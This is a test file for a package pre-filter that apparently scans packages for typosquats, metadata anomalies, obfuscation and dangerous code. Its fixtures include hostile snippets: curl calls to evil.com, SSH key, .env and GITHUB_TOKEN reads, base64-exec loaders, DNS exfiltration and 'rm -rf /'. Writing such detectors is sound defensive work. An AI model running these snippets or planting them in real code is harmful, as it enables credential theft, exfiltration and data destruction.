"""Tests for the static pre-filter engine."""

from aigate.config import Config
from aigate.models import PackageInfo, RiskLevel
from aigate.prefilter import (
    check_dangerous_patterns,
    check_extension_mismatch,
    check_high_entropy,
    check_metadata_anomalies,
    check_typosquatting,
    run_prefilter,
)


def _make_pkg(**kwargs) -> PackageInfo:
    defaults = dict(
        name="testpkg",
        version="1.0.0",
        ecosystem="pypi",
        author="Test Author",
        description="A test package",
        repository="https://github.com/test/testpkg",
    )
    defaults.update(kwargs)
    return PackageInfo(**defaults)


class TestTyposquatting:
    def test_exact_match_not_flagged(self):
        assert check_typosquatting("requests", "pypi") == []

    def test_obvious_typosquat(self):
        result = check_typosquatting("requets", "pypi")
        assert len(result) > 0
        assert any("requests" in r for r in result)

    def test_unrelated_name_not_flagged(self):
        result = check_typosquatting("my-totally-unique-package-xyz", "pypi")
        assert result == []

    def test_npm_ecosystem(self):
        result = check_typosquatting("expreess", "npm")
        assert len(result) > 0

    def test_crossenv_typosquat(self):
        """crossenv is a known typosquat of cross-env (npm)."""
        result = check_typosquatting("crossenv", "npm")
        assert any("cross-env" in r for r in result)

    def test_torchtriton_typosquat(self):
        """torchtriton is a known typosquat of pytorch-triton (pypi)."""
        result = check_typosquatting("torchtriton", "pypi")
        assert len(result) > 0

    def test_go_full_module_path_typosquat(self):
        """Go modules use full paths — compare last segment (e.g. viperr vs viper)."""
        result = check_typosquatting("github.com/spf13/viperr", "go")
        assert any("viper" in r for r in result)

    def test_go_short_name_typosquat(self):
        """Short Go package names should also be detected."""
        result = check_typosquatting("viperr", "go")
        assert any("viper" in r for r in result)

    def test_go_exact_module_path_not_flagged(self):
        """Exact match on last segment should not flag."""
        result = check_typosquatting("github.com/spf13/viper", "go")
        assert result == []

    # US-010 / Reviewer bug_011 — popular_map keys for new ecosystems

    def test_crates_typosquat_uses_crates_key(self):
        """resolver canonicalizes Rust to 'crates' (not 'cargo'). The popular_map
        must have a 'crates' key — previously fell through to POPULAR_PYPI and
        a real Rust typosquat 'toikio' (extra-i vs 'tokio') was unflagged."""
        result = check_typosquatting("toikio", "crates")
        assert any("tokio" in r for r in result), (
            f"expected 'tokio' typosquat detection on crates, got {result}"
        )

    def test_cocoapods_typosquat(self):
        """CocoaPods typosquats must be flagged against POPULAR_COCOAPODS."""
        result = check_typosquatting("AFNetworkin", "cocoapods")
        assert any("AFNetworking" in r for r in result), (
            f"expected 'AFNetworking' typosquat detection, got {result}"
        )

    def test_jsr_typosquat(self):
        """JSR typosquats must be flagged against POPULAR_JSR."""
        result = check_typosquatting("@std/fss", "jsr")
        assert any("@std/fs" in r for r in result), (
            f"expected '@std/fs' typosquat detection on jsr, got {result}"
        )

    def test_unknown_ecosystem_returns_empty_not_pypi_fallback(self):
        """Unknown ecosystem must NOT silently fall back to POPULAR_PYPI;
        empty result avoids cross-ecosystem similarity false positives."""
        # 'requets' is a near-miss for 'requests' (PyPI); under the old
        # POPULAR_PYPI fallback it would flag here too. We expect [].
        result = check_typosquatting("requets", "made-up-ecosystem")
        assert result == [], f"unknown ecosystem leaked POPULAR_PYPI signals: {result}"

    def test_typosquat_popular_map_covers_all_supported_ecosystems(self):
        """Future-proofing: every ecosystem the CLI advertises must have
        a popular_map entry (or explicit empty-set fallback). Iterates
        the canonical SUPPORTED_ECOSYSTEMS tuple from the cli module."""
        from aigate.cli import SUPPORTED_ECOSYSTEMS

        for eco in SUPPORTED_ECOSYSTEMS:
            # Just call it on a benign name; no assertion on result content.
            # We just ensure no UNHANDLED_ECOSYSTEM warning is needed for any
            # CLI-supported ecosystem (the call returns [] but doesn't WARN
            # for known ecosystems).
            check_typosquatting("definitely-a-fresh-name-xyz", eco)


class TestMetadataAnomalies:
    def test_normal_package(self):
        pkg = _make_pkg()
        assert check_metadata_anomalies(pkg) == []

    def test_no_author(self):
        pkg = _make_pkg(author="")
        signals = check_metadata_anomalies(pkg)
        assert any("no_author" in s for s in signals)

    def test_no_repo(self):
        pkg = _make_pkg(repository="", homepage="")
        signals = check_metadata_anomalies(pkg)
        assert any("no_repo" in s for s in signals)

    def test_low_downloads(self):
        pkg = _make_pkg(download_count=5)
        signals = check_metadata_anomalies(pkg)
        assert any("low_downloads" in s for s in signals)

    def test_install_scripts(self):
        pkg = _make_pkg(has_install_scripts=True)
        signals = check_metadata_anomalies(pkg)
        assert any("has_install_scripts" in s for s in signals)


class TestDangerousPatterns:
    def test_clean_code(self):
        files = {"main.py": "def hello():\n    print('hello world')\n"}
        assert check_dangerous_patterns(files) == []

    def test_eval_detected(self):
        files = {"setup.py": "eval(compile(data, '<string>', 'exec'))"}
        signals = check_dangerous_patterns(files)
        assert len(signals) > 0
        assert any("eval" in s for s in signals)

    def test_credential_access(self):
        files = {"inject.py": "open(os.path.expanduser('~/.ssh/id_rsa')).read()"}
        signals = check_dangerous_patterns(files)
        assert any(".ssh/" in s for s in signals)

    def test_base64_exec(self):
        files = {"loader.py": "exec(base64.b64decode(payload))"}
        signals = check_dangerous_patterns(files)
        assert len(signals) >= 2  # base64 + exec

    def test_env_token_theft(self):
        files = {"steal.py": "token = os.environ.get('GITHUB_TOKEN')"}
        signals = check_dangerous_patterns(files)
        assert any("GITHUB_TOKEN" in s for s in signals)

    def test_pth_file(self):
        files = {"evil.pth": "import os; os.system('curl http://evil.com')"}
        signals = check_dangerous_patterns(files)
        assert any("HIGH" in s for s in signals)  # .pth = install file = HIGH

    # --- S1: ctypes/importlib/getattr bypass detection ---
    def test_ctypes_cdll_detected(self):
        files = {"setup.py": "ctypes.CDLL('libevil.so')"}
        signals = check_dangerous_patterns(files)
        assert any("ctypes" in s.lower() or "CDLL" in s for s in signals)

    def test_importlib_import_module_detected(self):
        files = {"setup.py": "importlib.import_module('os')"}
        signals = check_dangerous_patterns(files)
        assert any("importlib" in s for s in signals)

    def test_getattr_os_system_detected(self):
        files = {"setup.py": "getattr(os, 'system')('rm -rf /')"}
        signals = check_dangerous_patterns(files)
        assert any("getattr" in s for s in signals)

    def test_marshal_loads_detected(self):
        files = {"setup.py": "marshal.loads(payload)"}
        signals = check_dangerous_patterns(files)
        assert any("marshal" in s for s in signals)

    def test_child_process_detected(self):
        files = {"postinstall.js": "require('child_process').exec('curl evil.com')"}
        signals = check_dangerous_patterns(files)
        assert any("child_process" in s for s in signals)

    def test_process_binding_detected(self):
        files = {"setup.js": "process.binding('spawn_sync')"}
        signals = check_dangerous_patterns(files)
        assert any("process.binding" in s or "binding" in s for s in signals)

    def test_constructor_constructor_detected(self):
        files = {"setup.js": "this.constructor.constructor('return process')()"}
        signals = check_dangerous_patterns(files)
        assert any("constructor" in s for s in signals)

    def test_new_function_detected(self):
        files = {"setup.js": "new Function('return this')()"}
        signals = check_dangerous_patterns(files)
        assert any("Function" in s or "new Function" in s for s in signals)

    # --- S2: .pth file with bare import ---
    def test_pth_bare_import_detected(self):
        """Any .pth file should auto-generate a HIGH signal regardless of content."""
        files = {"evil.pth": "import evil_module"}
        signals = check_dangerous_patterns(files)
        assert any("HIGH" in s for s in signals)

    # --- S3: install_files set incomplete ---
    def test_conftest_py_high_risk(self):
        files = {"conftest.py": "exec(base64.b64decode(payload))"}
        signals = check_dangerous_patterns(files)
        assert any("HIGH" in s for s in signals)

    def test_dunder_main_py_high_risk(self):
        files = {"__main__.py": "os.system('curl evil.com')"}
        signals = check_dangerous_patterns(files)
        assert any("HIGH" in s for s in signals)

    def test_makefile_high_risk(self):
        files = {"Makefile": "os.system('rm -rf /')"}
        signals = check_dangerous_patterns(files)
        assert any("HIGH" in s for s in signals)

    def test_cmakelists_high_risk(self):
        files = {"CMakeLists.txt": "exec(compile(data, 'x', 'exec'))"}
        signals = check_dangerous_patterns(files)
        assert any("HIGH" in s for s in signals)

    def test_prepare_js_high_risk(self):
        files = {"prepare.js": "require('child_process').exec('curl evil.com')"}
        signals = check_dangerous_patterns(files)
        assert any("HIGH" in s for s in signals)

    # --- S4: .env regex false positive on process.env ---
    def test_process_env_no_false_positive(self):
        """process.env.HOME should NOT trigger the .env pattern."""
        files = {"main.js": "const home = process.env.HOME;"}
        signals = check_dangerous_patterns(files)
        assert not any(".env" in s and "dangerous_pattern" in s for s in signals)

    def test_open_dotenv_detected(self):
        """open('.env') SHOULD trigger the .env pattern."""
        files = {"steal.py": "open('.env').read()"}
        signals = check_dangerous_patterns(files)
        assert any(".env" in s or "env" in s for s in signals)

    # --- S5: DNS exfiltration detection ---
    def test_dns_exfiltration_getaddrinfo(self):
        files = {"setup.py": "socket.getaddrinfo(data + '.evil.com', 80)"}
        signals = check_dangerous_patterns(files)
        assert any("getaddrinfo" in s or "dns" in s.lower() for s in signals)

    def test_dns_exfiltration_create_connection(self):
        files = {"setup.py": "socket.create_connection(('evil.com', 80))"}
        signals = check_dangerous_patterns(files)
        assert any("create_connection" in s for s in signals)

    def test_dns_resolver_detected(self):
        files = {"setup.py": "dns.resolver.resolve(data + '.evil.com', 'A')"}
        signals = check_dangerous_patterns(files)
        assert any("dns" in s and "resolver" in s for s in signals)

    # --- S6: process.exit / os._exit / os.kill ---
    def test_process_exit_detected(self):
        files = {"index.js": "process.exit(0)"}
        signals = check_dangerous_patterns(files)
        assert any("process.exit" in s or "exit" in s for s in signals)

    def test_os_exit_detected(self):
        files = {"setup.py": "os._exit(1)"}
        signals = check_dangerous_patterns(files)
        assert any("os._exit" in s or "_exit" in s for s in signals)

    def test_os_kill_detected(self):
        files = {"setup.py": "os.kill(pid, signal.SIGKILL)"}
        signals = check_dangerous_patterns(files)
        assert any("os.kill" in s or "kill" in s for s in signals)


class TestHighEntropy:
    def test_normal_code(self):
        files = {"main.py": "x = 1\ny = 2\nprint(x + y)\n"}
        assert check_high_entropy(files) == []

    def test_obfuscated_string(self):
        # Generate a high-entropy line (random-looking)
        obf = "a" * 20 + "".join(chr(i % 94 + 33) for i in range(100))
        files = {"obf.py": obf}
        signals = check_high_entropy(files, threshold=4.5)
        assert len(signals) > 0


class TestRunPrefilter:
    def test_whitelisted_package(self):
        pkg = _make_pkg(name="safe-pkg")
        config = Config(whitelist=["safe-pkg"])
        result = run_prefilter(pkg, config)
        assert result.passed
        assert result.risk_level == RiskLevel.NONE

    def test_blocklisted_package(self):
        pkg = _make_pkg(name="evil-pkg")
        config = Config(blocklist=["evil-pkg"])
        result = run_prefilter(pkg, config)
        assert not result.passed
        assert result.risk_level == RiskLevel.CRITICAL

    def test_clean_package(self):
        pkg = _make_pkg()
        config = Config()
        result = run_prefilter(pkg, config)
        assert result.passed

    def test_suspicious_package_needs_ai(self):
        pkg = _make_pkg(
            name="testpkg", has_install_scripts=True, author="", repository="", homepage=""
        )
        config = Config()
        source = {"setup.py": "exec(base64.b64decode(os.environ['PAYLOAD']))"}
        result = run_prefilter(pkg, config, source)
        assert result.needs_ai_review
        assert result.risk_level in (RiskLevel.HIGH, RiskLevel.CRITICAL)


class TestExtensionMismatch:
    """Verify extension_mismatch signals are generated."""

    def test_python_in_png_generates_signal(self):
        source = {"pkg-1.0/logo.png": "#!/usr/bin/env python3\nimport os\nos.system('evil')\n"}
        config = Config()
        pkg = _make_pkg()
        result = run_prefilter(pkg, config, source)
        assert any("extension_mismatch" in s for s in result.risk_signals)

    def test_js_in_css_generates_signal(self):
        source = {
            "pkg-1.0/styles.css": "const fs = require('fs');\nfs.readFileSync('/etc/passwd');\n"
        }
        config = Config()
        pkg = _make_pkg()
        result = run_prefilter(pkg, config, source)
        assert any("extension_mismatch" in s for s in result.risk_signals)

    def test_extensionless_python_generates_signal(self):
        source = {"pkg-1.0/run": "#!/usr/bin/env python3\nimport os\n"}
        config = Config()
        pkg = _make_pkg()
        result = run_prefilter(pkg, config, source)
        assert any("extension_mismatch" in s for s in result.risk_signals)

    def test_normal_py_no_mismatch(self):
        source = {"pkg-1.0/main.py": "import os\nprint('hello')\n"}
        config = Config()
        pkg = _make_pkg()
        result = run_prefilter(pkg, config, source)
        assert not any("extension_mismatch" in s for s in result.risk_signals)

    def test_check_extension_mismatch_direct(self):
        """Direct function test — not through run_prefilter pipeline."""
        source = {"evil.png": "import subprocess\nsubprocess.call(['evil'])\n"}
        signals = check_extension_mismatch(source)
        assert len(signals) == 1
        assert "extension_mismatch(HIGH)" in signals[0]
